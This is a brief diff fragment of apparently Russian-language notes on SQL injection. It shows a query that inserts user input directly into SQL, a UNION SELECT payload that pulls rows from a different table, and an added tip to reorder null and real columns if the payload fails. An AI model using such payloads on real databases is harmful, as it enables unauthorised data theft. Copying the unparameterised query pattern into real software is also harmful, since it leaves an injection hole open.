@@ -79,3 +79,4 @@ SELECT * FROM gamers WHERE id='$text'
 ```sql
 SELECT * FROM gamers WHERE id='' UNION SELECT Null as rand_text, * FROM classmates --'
 ```
+Если не воркает, надо пробовать менять порядок нормальных, и пустых колонок.
